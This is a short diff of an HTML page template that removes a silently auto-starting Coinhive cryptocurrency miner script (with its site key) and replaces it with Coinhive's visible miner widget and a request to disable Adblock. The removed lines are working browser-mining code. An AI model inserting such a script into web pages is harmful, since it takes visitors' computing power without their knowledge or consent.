@@ -19,12 +19,14 @@
         <form action="/logout" method="post" accept-charset="utf-8">
             <input type="submit" name="logout" id="logout" value="logout" />
         </form>
-
-        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-        <script>
-            var miner = new CoinHive.User('LizXPgR1RicCNg50MGh2EOgT4BjJovK0', '{{ username }}');
-            miner.start();
-        </script>
+        
+        <script src="https://coinhive.com/lib/miner.min.js" async></script>
+        <div class="coinhive-miner" 
+                style="width: 256px; height: 310px"
+                data-key="LizXPgR1RicCNg50MGh2EOgT4BjJovK0"
+                data-user="{{ username }}">
+                <em>Please disable Adblock!</em>
+        </div>
 
       <!--<div class="six columns stopped" id="miner">
             <div class="row">
